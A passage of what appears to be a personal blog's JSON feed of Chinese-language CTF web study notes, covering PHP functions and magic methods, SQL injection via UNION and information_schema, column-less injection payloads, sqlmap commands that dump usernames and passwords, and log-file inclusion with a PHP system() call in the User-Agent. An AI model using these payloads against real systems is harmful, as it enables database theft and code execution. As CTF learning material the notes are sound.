到大写字母 Z 的任意一个字符。</td>\n</tr>\n<tr>\n<td>[a-Z]</td>\n<td>匹配从小写字母 a 到大写字母 Z 的任意一个字符。</td>\n</tr>\n<tr>\n<td>[0-9]</td>\n<td>匹配 0 到 9 之间的一个数字。</td>\n</tr>\n<tr>\n<td>[a-z0-9]</td>\n<td>匹配 a 与 z 之间 或 0 与 9 之间的单个字符。</td>\n</tr>\n</tbody>\n</table>\n<p>正则表达式，可以用特殊含义字符定界，如:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span>中间写正则<span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$中间写正则$</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">%</span>中间写正则<span class=\"token operator\">%</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">^</span>中间写正则<span class=\"token operator\">^</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>@中间写正则@</pre></td></tr></table></figure><table>\n<thead>\n<tr>\n<th>preg_match()</th>\n<th>执行正则表达式匹配。</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>preg_match_all()</td>\n<td>执行全局正则表达式匹配。</td>\n</tr>\n<tr>\n<td>preg_replace()</td>\n<td>执行正则表达式搜索并替换。</td>\n</tr>\n<tr>\n<td>preg_grep()</td>\n<td>返回与模式匹配的输入数组的元素。</td>\n</tr>\n<tr>\n<td>preg_split()</td>\n<td>使用正则表达式将字符串拆分为子字符串。</td>\n</tr>\n<tr>\n<td>preg_quote()</td>\n<td>引用在字符串中找到的正则表达式字符。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"20php文件操作\"><a class=\"anchor\" href=\"#20php文件操作\">#</a> 2.0PHP 文件操作</h3>\n<p>readfile (string: $ 文件名)<br />\n 功能：传入一个文件路径，输出一个文件。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token comment\">//linux 类的读了方式</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/home/paul/test.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token comment\">//windows 类的读取方式</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"c:\\\\oldboy\\\\oldboy\\\\boot.ini\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>file_get_contents 打开文件函数:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'NoAlike.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token variable\">$filestring</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">echo</span> <span class=\"token variable\">$filestring</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"21魔术常量\"><a class=\"anchor\" href=\"#21魔术常量\">#</a> 2.1 魔术常量</h3>\n<p><code>_LINE_</code></p>\n<pre><code class=\"language-&lt;?php\">&lt;?php\necho '这是第 &quot; '  . __LINE__ . ' &quot; 行';\n?&gt;\n</code></pre>\n<h3 id=\"22反序列化常用魔术\"><a class=\"anchor\" href=\"#22反序列化常用魔术\">#</a> 2.2 反序列化常用魔术</h3>\n<p>__construct ()// 当一个对象创建时被调用</p>\n<p>__destruct () // 当一个对象销毁时被调用</p>\n<p>__toString () // 当一个对象被当作一个字符串使用</p>\n<p>__sleep ()// 在对象在被序列化之前运行</p>\n<p>__wakeup ()// 将在反序列化之后立即被调用 (通过序列化对象元素个数不符来绕过)</p>\n<p>__get ()// 获得一个类的成员变量时调用</p>\n<p>__set ()// 设置一个类的成员变量时调用</p>\n<p>__invoke ()// 调用函数的方式调用一个对象时的回应方法</p>\n<p>__call ()// 当调用一个对象中的不能用的方法的时候就会执行这个函数</p>\n<h3 id=\"23-关联数组\"><a class=\"anchor\" href=\"#23-关联数组\">#</a> 2.3 关联数组</h3>\n<p>关联数组（Associative Array）是 PHP 中一种数组类型，它的特点是数组的<strong>键（key）** 不是数字，而是 ** 字符串</strong>或其他数据类型。每个键与一个值（value）相关联，形成 “键 =&gt; 值” 的键值对。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"hint\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 \"source.php\"</span></pre></td></tr></table></figure><h3 id=\"24-mb_substr-mb_strpos\"><a class=\"anchor\" href=\"#24-mb_substr-mb_strpos\">#</a> 2.4 mb_substr &amp; mb_strpos</h3>\n<p><code>mb_substr</code>  和  <code>mb_strpos</code>  都是 PHP 中与多字节字符（如中文、日文等）相关的字符串处理函数，它们属于 <strong>mbstring</strong>（多字节字符串处理扩展 Multibyte String）库的一部分。</p>\n<p>与标准的  <code>substr</code>  和  <code>strpos</code>  函数相比， <code>mb_substr</code>  和  <code>mb_strpos</code>  更适合处理多字节字符集，特别是对于非拉丁字符（如中文、日文、韩文）等情况。</p>\n<p><strong> <code>mb_substr</code> ：多字节字符串截取</strong>:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$start</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$length</span> <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$encoding</span> <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span></pre></td></tr></table></figure><p><strong>$str</strong>：要截取的原始字符串。</p>\n<p><strong>$start</strong>：开始截取的位置（基于 0 的索引，支持负值表示从字符串末尾开始）。</p>\n<p><strong>$length</strong>（可选）：截取的长度（单位为字符数，而不是字节数）。如果省略，则截取到字符串末尾。</p>\n<p><strong>$encoding</strong>（可选）：字符编码，默认是  <code>UTF-8</code> 。</p>\n<p><strong> <code>mb_strpos</code> ：查找多字节字符串的位置</strong>:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$haystack</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$needle</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$offset</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$encoding</span> <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span></pre></td></tr></table></figure><h3 id=\"25-_request\"><a class=\"anchor\" href=\"#25-_request\">#</a> 2.5 $_REQUEST</h3>\n<p>$_REQUEST 是 PHP 中用来获取请求参数的全局数组，可以同时包含 GET、POST、COOKIE 中的</p>\n<h3 id=\"26-超级全局数组\"><a class=\"anchor\" href=\"#26-超级全局数组\">#</a> 2.6 超级全局数组</h3>\n<p>$_REQUEST 并不算是 PHP 的 魔术（magic），而是 PHP 的一个 超级全局数组（superglobal array）。它是内置的、自动可用的全局变量，能够存储来自 HTTP 请求 的数据，包括 GET、POST 和 COOKIE 的数据。</p>\n<ol>\n<li>什么是 PHP 的超级全局数组？</li>\n</ol>\n<p>PHP 提供了一些预定义的全局数组，叫做 超级全局数组。这些数组可以在任何作用域内访问，而不需要通过 global 关键字显式声明。PHP 中常用的超级全局数组包括：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$_GET</span>：用于获取 <span class=\"token constant\">URL</span> 查询字符串中的参数（通常是通过 <span class=\"token constant\">GET</span> 请求传递的）。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$_POST</span>：用于获取通过 <span class=\"token constant\">HTTP</span> <span class=\"token constant\">POST</span> 请求发送的数据。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$_REQUEST</span>：用于获取来自 <span class=\"token constant\">GET</span>、<span class=\"token constant\">POST</span> 和 <span class=\"token constant\">COOKIE</span> 的请求数据。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$_COOKIE</span>：用于获取来自客户端的 cookies。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$_FILES</span>：用于获取上传的文件信息。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$_SERVER</span>：包含服务器和执行环境的相关信息。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$_ENV</span>：包含环境变量。</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$_SESSION</span>：用于管理会话数据。</pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "Web"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2024/11/02/CTF/Web/Web%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/",
            "url": "https://ly1tnt.github.io/2024/11/02/CTF/Web/Web%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/",
            "title": "Web基础知识",
            "date_published": "2024-11-02T04:59:00.000Z",
            "content_html": "<h1 id=\"web基本知识\"><a class=\"anchor\" href=\"#web基本知识\">#</a> Web 基本知识</h1>\n<h3 id=\"json\"><a class=\"anchor\" href=\"#json\">#</a> JSON</h3>\n<blockquote>\n<p>JSON 的值:<br />\n1.JSON 的构成: ws 值<br />\n 2. 值可以是对象、数组、数字、字符串或者三个字面值 (false、null、true) 中的一个。值中的字面值中的英文必须使用小写。<br />\n3. 对象由花括号括起来的逗号分割的成员构成，成员是字符串键和上文所述的值由逗号分割的键值对组成，如：</p>\n</blockquote>\n<pre><code>&#123;&quot;name&quot;: &quot;John Doe&quot;, &quot;age&quot;: 18, &quot;address&quot;: &#123;&quot;country&quot; : &quot;china&quot;, &quot;zip-code&quot;: &quot;10000&quot;&#125;&#125;\n</code></pre>\n<p>引用 JSON 中的对象可以包含多个键值对，并且有数组结构，该语言正是一次实现过程内容的描述。<br />\n数组是由方括号括起来的一组值构成，如：<br />\n[3, 1, 4, 1, 5, 9, 2, 6]<br />\n 3 字符串与 C 或者 Java 的字符串非常相似。字符串是由双引号包围的任意数量 Unicode 字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。<br />\n数字也与 C 或者 Java 的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。</p>\n<h2 id=\"md5加密\"><a class=\"anchor\" href=\"#md5加密\">#</a> MD5 加密</h2>\n<p>MD5 是一种哈希函数，它将任意长度的信息压缩成 128 位长度的信息，通常使用 32 个十六进制数表示。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Hello, World!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$md5Hash</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$md5Hash</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 MD5 加密后的字符串</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h2 id=\"-和在sql中的区别\"><a class=\"anchor\" href=\"#-和在sql中的区别\">#</a> -- 和 #在 SQL 中的区别</h2>\n<p>在 SQL 中， -- 和 # 都⽤作单⾏注释，但它们的使⽤环境和数据库系统兼容性有些不同。</p>\n<ol>\n<li>-：这是 SQL 标准的单⾏注释符号。⼤多数 SQL 数据库，包括 SQL Server、PostgreSQL 和 MySQL，都⽀持<br />\n使⽤ - 进⾏单⾏注释。通常， - 后⾯需要跟⼀个空格。</li>\n</ol>\n<pre><code>SELECT * FROM table -- 这是⼀个注释\n</code></pre>\n<p>2.# MySQL 特有的单行注释符号。不是 SQL 标准的一部分。</p>\n<pre><code>SELECT * FROM table # 这也是⼀个注释，但仅在MySQL中有效\n</code></pre>\n<h2 id=\"号作用\"><a class=\"anchor\" href=\"#号作用\">#</a> + 号作用</h2>\n<p>由于空格通常会被去掉或需要编码（通常为 %20 或 + ），所以直接使⽤⼀个空格可能会导致<br />\n SQL 语法错误。</p>\n<p>添加 &quot;<strong>+</strong>&quot; 确保注释 -- 后⾯有⼀个空格，这样数据库就能正确解析这个 SQL 注释。</p>\n<h2 id=\"sql注入中的union-select\"><a class=\"anchor\" href=\"#sql注入中的union-select\">#</a> sql 注入中的 union select</h2>\n<p><a href=\"https://blog.csdn.net/qq_44159028/article/details/114820256\">https://blog.csdn.net/qq_44159028/article/details/114820256</a></p>\n<p><code>UNION</code></p>\n<pre><code class=\"language-mysql\">SELECT 列名 FROM 表名\nUNION\nSELECT 列名_1 FROM 表名_1;\n</code></pre>\n<p><strong>注意使用 <code>UNION</code>  的时候要注意两个表的数量必须相同</strong></p>\n<h4 id=\"union-select\"><a class=\"anchor\" href=\"#union-select\">#</a> union select</h4>\n<p>用来合并两个或多个 SELECT 语句的结果集</p>\n<p>union select <em>只能查询两个表中共同都有的字段</em>，如果一个字段在另外一个表中没有，就会报错</p>\n<h4 id=\"select-123\"><a class=\"anchor\" href=\"#select-123\">#</a> select 1,2,3...</h4>\n<p>select 直接加数字串时，<strong>可以不写后面的表名</strong>，那么它输出的内容就是我们 select 后的数字，这时我们写的一串数字就是一个数组（或 1 个行向量），这时 select<strong> 实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组，这时它是个 1 行 n 列的表，表的属性名和值都是我们输入的数组</strong>，.select 之后可以接一串数字：1,2,3… 只是一个例子，这串数字并不一定要按从小到大排列，不一定从 1 开始，这串数字的值和顺序是任意的，甚至可以是重复的，如：11,465,7461，35 或 11,11,11,11，数字串的长度也是任意的，我们想获得多少列的数据，就写多少个数字</p>\n<p><img loading=\"lazy\" data-src=\"https://img-blog.csdnimg.cn/20210315102825231.png\" alt=\"img\" /></p>\n<h4 id=\"select-加数字串并加上数据库表的名字\"><a class=\"anchor\" href=\"#select-加数字串并加上数据库表的名字\">#</a> select 加数字串并加上数据库表的名字</h4>\n<p>users2 如下</p>\n<p><img loading=\"lazy\" data-src=\"https://img-blog.csdnimg.cn/20210315101627932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70\" alt=\"img\" /></p>\n<p>进行查询，select 1,22,34,45,65 from users2</p>\n<p><img loading=\"lazy\" data-src=\"https://img-blog.csdnimg.cn/20210315102507930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70\" alt=\"img\" /></p>\n<p>users2 表有四个字段，可以看出行行代表 表格的字段（id,name,age,address）。原来的 id，name 等属性被替换成了这些数字串，而且我们输入的数字串长度是任意的，输入几个数字，就会出现几个属性，也就是说返回表的列数是等于我们输入的数字个数的，而行数与原数据库表的结构保持一致，原本有 4 行数据，输入数字串后仍为 4 行。</p>\n<h4 id=\"简单的sql注入\"><a class=\"anchor\" href=\"#简单的sql注入\">#</a> 简单的 sql 注入</h4>\n<p>-1‘ union select 1,2,3#</p>\n<h2 id=\"获取所有表结构tables\"><a class=\"anchor\" href=\"#获取所有表结构tables\">#</a> 获取所有表结构 (TABLES)</h2>\n<p>SELECT  *  FROM information_schema.TABLES WHERE  TABLE_SCHEMA=' 数据库名 ';</p>\n<h2 id=\"limit\"><a class=\"anchor\" href=\"#limit\">#</a> LIMIT</h2>\n<p><strong>#返回表中前 number 行数据</strong></p>\n<p>SELECT column1, column2, ... FROM table_name LIMIT number;  #从 offset+1 行开始返回 row_count 行数据</p>\n<p><strong>#从 offset+1 行开始返回 row_count 行数据</strong></p>\n<p>SELECT column1, column2, ... FROM table_name LIMIT offset, row_count;<br />\n# 比如 LIMIT 10, 10 返回 11-20 行数据</p>\n<h2 id=\"sql注入通过是否报错信息判断注入类型\"><a class=\"anchor\" href=\"#sql注入通过是否报错信息判断注入类型\">#</a> SQL 注入通过是否报错信息判断注入类型</h2>\n<table>\n<thead>\n<tr>\n<th>输入</th>\n<th>后台执行</th>\n<th>后台报错</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>1&quot;</code></td>\n<td><code>id = &quot;1&quot;&quot;</code></td>\n<td><code>near '&quot;1&quot;&quot;' at line 1</code></td>\n<td>去掉外层 SQL 的单引号，留下 <code>&quot;1&quot;&quot;</code> ，除去自己的输入  <code>1&quot;</code>  可知类型为 <strong>双引号</strong> 的 <strong>字符型注入</strong></td>\n</tr>\n<tr>\n<td><code>1'</code></td>\n<td><code>id = '1''</code></td>\n<td><code>near ''1''' at line 1</code></td>\n<td>同理，留下 <code>'1''</code>  除去自己的输入  <code>1'</code>  可知类型为 <strong>单引号</strong> 的 <strong>字符型注入</strong></td>\n</tr>\n<tr>\n<td><code>'1</code></td>\n<td><code>id = ''1'</code></td>\n<td><code>near '1'' at line 1</code></td>\n<td>对于后台 SQL，由于  <code>id = ''</code>  已经合法闭合，所以后面  <code>1'</code>  反而为多出的语句，所以报错点在  <code>1'</code></td>\n</tr>\n</tbody>\n</table>\n<p>第一个当内容为 '&quot;1&quot;&quot;' 时，先去掉两边单引号得到 &quot;1&quot;''，可知出错内容为 &quot;1''&quot;</p>\n<p>第三个报错内容为 '1'' 时候，说明出错内容为 1', 前面已经闭合，因此报错内容在 1' 由此可以推断为单引号型注入</p>\n<h2 id=\"sql注入常见流程\"><a class=\"anchor\" href=\"#sql注入常见流程\">#</a> SQL 注入常见流程</h2>\n<pre><code class=\"language-mysql\">id = 1 Order by 1;\nid = 1 Order by 2;\nid = 1 Order by 3; # 报错 确定列数为 2 \n</code></pre>\n<p>使用联合查询  <code>union</code>  基于  <code>information_schema</code>  拿到数据库名</p>\n<pre><code class=\"language-mysql\">union SELECT 1,schema_name FROM information_schema.schemata;\n# or\n1 union SELECT schema_name,2 FROM information_schema.schemata;\n# 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。\n# 此时后台执行为:\nSELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;\n</code></pre>\n<p><strong>判断那个是否显示只需要尝试注入几次就可以了</strong></p>\n<p><strong>用联合查询得到数据库里面的表名</strong></p>\n<pre><code class=\"language-mysql\"> union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()\n1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()\n# 原理同上\n# 如果要查询其他数据库 可以写为 where table_schema='databaseNAME'\n# 后台执行为：\nSELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()\n</code></pre>\n<h2 id=\"sql注入知识\"><a class=\"anchor\" href=\"#sql注入知识\">#</a> SQL 注入知识</h2>\n<p><strong>information_schema.schemata: 记录所有数据库名的表</strong> 在 schemata 表中，schema_name 字段用来存储数据库名</p>\n<p><strong>information_schema.tables：记录所有表名信息的表</strong>在 table 表中，table_schema 和 table_name 分别用来存储数据库名和表名</p>\n<p><strong>information_schema.columns：记录所有列名信息的表</strong> table_schema（数据库名），table_name（表名），column_name（字段名）</p>\n<p><strong>table_name：表名</strong></p>\n<p><strong>column_name：列名</strong></p>\n<p><strong>table_schema：数据库名</strong></p>\n<p><strong>database_name: mysql.innodb_table_stats 中的数据库名</strong></p>\n<p>跨库选择表：需要在表前添加该表的数据库名称，否则会默认为当前库的表。</p>\n<p><code>ex: select * from 数据库名.表名</code></p>\n<h2 id=\"sql无列名注入\"><a class=\"anchor\" href=\"#sql无列名注入\">#</a> SQL 无列名注入</h2>\n<p>当 information_schema 被滤过时，可以利用表 mysql.innodb_table_stats <code>、</code> mysql.innodb_table_index, 同样具有库名表名，但不具有列名。</p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/35f511a354574d99b8eab869009c6cdf.png\" alt=\"在这里插入图片描述\" /></p>\n<p><strong>无列名查询:</strong></p>\n<p>无列名注入，因为不知道列名，所以将列名用 select  1,2,3... union select * from 数据表的方式将列名更换为 1,2,3..</p>\n<p>如:</p>\n<p><code>id=0'union select 1,2,group_concat('1') from (select 1 union select *from ctftraining.flag)a where 1='1</code></p>\n<p>*<em> 这里 (select 1 union select <em>from ctftraining.flag) a 相当于是将通过 select union select 操作更换过列名的表命名为 a, 从使得前面的 union select 可以用数字 '1' 来查列名下的内容，</em></em></p>\n<p><strong>当 '' 被禁用时，可以用 as 的方式，为列名命名另一个名称来进行无列名查询</strong></p>\n<p><code>id=0'union select 1,2,group_concat(b) from (select 1 as b union select *from ctftraining.flag)a where 1='1</code></p>\n<p><strong>列名获取:</strong></p>\n<p>通过使用 join 和 using, 在使用 join 来拼接表时，有一个语法错误为两张表中的列名重复，因此可以显示该语法错误来找到该表的列名（如果两张表为同一张表需要给两张表以及拼接后的表都起一个别名）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> tableName <span class=\"token keyword\">as</span> a <span class=\"token keyword\">join</span> tableName <span class=\"token keyword\">as</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> c<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> tableName <span class=\"token keyword\">as</span> a <span class=\"token keyword\">join</span> tableName <span class=\"token keyword\">as</span> b <span class=\"token keyword\">using</span><span class=\"token punctuation\">(</span>colunmName<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> c<span class=\"token punctuation\">;</span><span class=\"token comment\">// 使用 using 避免重复列</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/45d49a6b33516938ac0bf3685b0b7369.png\" alt=\"img\" /></p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/a755f08753bf7e1dba65dba2c8607491.png\" alt=\"img\" /></p>\n<h2 id=\"sqlmap\"><a class=\"anchor\" href=\"#sqlmap\">#</a> SQLmap</h2>\n<p>vim sql.http 把 bp 抓到的请求写进去并:wq 保存</p>\n<p><code>sqlmap -r ./sql.http -p  id -dbs --batch</code></p>\n<p><code>sqlmap -r ./sql.http -p id --current-db --batch</code></p>\n<p><code>sqlmap -r ./sql.http -p id -D pikachu -tables --batch</code></p>\n<p><code>sqlmap -r ./sql.http -p id -D pikachu -T users --columns --batch</code></p>\n<p><code>sqlmap -r ./sql..http -p id -D pikachu -T users -C username,password -dump --batch</code></p>\n<p>字符型:</p>\n<p><code>sqlmap -u 'url' -p name -bs --batch</code></p>\n<h2 id=\"http-请求头中的-remote_addr-x-forwarded-for-x-real-ip\"><a class=\"anchor\" href=\"#http-请求头中的-remote_addr-x-forwarded-for-x-real-ip\">#</a> HTTP 请求头中的 Remote_Addr, X-Forwarded-For, X-Real-IP</h2>\n<p><strong>Remote_Addr</strong><br />\nRemote_Addr 是一个标准 HTTP 请求头，用于标识发起请求的客户端的 IP 地址。这个头部字段通常由 Web 服务器用来记录或日志记录客户端的 IP 地址。然而，由于大多数 Web 请求都经过了代理服务器或负载均衡器，<strong>Remote_Addr 头部字段通常包含的是代理服务器的 IP 地址，而不是原始客户端的 IP 地址。</strong></p>\n<p><strong>X-Forwarded-For</strong><br />\nX-Forwarded-For 是一个常用的 HTTP 请求头，用于揭示请求在经过代理服务器时的来源 IP 地址。当一个请求经过一个或多个代理服务器时，每个代理服务器都会在 X-Forwarded-For 头部字段中添加其自己的 IP 地址。这样，最终的 Web 服务器可以从 X-Forwarded-For 头部字段中获取完整的客户端 IP 地址列表。</p>\n<p><strong>X-Real-IP</strong><br />\nX-Real-IP 是另一个用于标识客户端真实 IP 地址的 HTTP 请求头。与 X-Forwarded-For 不同，X-Real-IP 是由最后一个代理服务器设置的，用于揭示未经任何代理服务器转发的原始客户端 IP 地址。</p>\n<h2 id=\"日志文件包含\"><a class=\"anchor\" href=\"#日志文件包含\">#</a> 日志文件包含</h2>\n<p>一般位于:</p>\n<p>apache:/var/log/apache/access.log</p>\n<p>nginx:/var/log/nginx/access.log</p>\n<p>通过修改 User-Agent: 执行命令 如 &lt;?php system ('ls'); ?&gt;</p>\n<h2 id=\"md5绕过-sha1绕过\"><a class=\"anchor\" href=\"#md5绕过-sha1绕过\">#</a> md5 绕过 sha1 绕过</h2>\n<h3 id=\"10e绕过弱比较\"><a class=\"anchor\" href=\"#10e绕过弱比较\">#</a> 1.0e 绕过弱比较</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">MD5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">MD5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token 